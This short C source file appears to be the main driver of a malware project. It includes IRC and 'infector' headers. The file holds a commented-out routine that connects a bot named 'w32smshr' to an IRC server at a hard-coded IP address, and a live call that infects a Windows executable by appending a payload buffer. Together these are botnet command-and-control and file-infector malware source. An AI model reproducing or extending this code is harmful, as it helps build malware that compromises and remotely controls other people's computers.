#include "config.h"

#include <stdio.h>
#include <stdlib.h>

#include "log.h"
#include "irc.h"
#include "infector.h"


int main(int argc, char * argv[])
{
    /*
      if (prepareBot("188.126.73.62", 6667) != 0) {
        getchar();
        exit(1);
      }

      printf("connected\n");
      botHello("w32smshr", "w32smshr", "w32smshr");
      botLoop();
    */

    #define TESTSTR "AAAA"
    if (infectFile(TESTSTR, 4, "C:\\Users\\null\\Documents\\calc.exe") != ERR_OK) {
        D2("appendBuf2Bin failed.\n");
    }

    D2("done.\n");
    getchar();
    return 0;
}
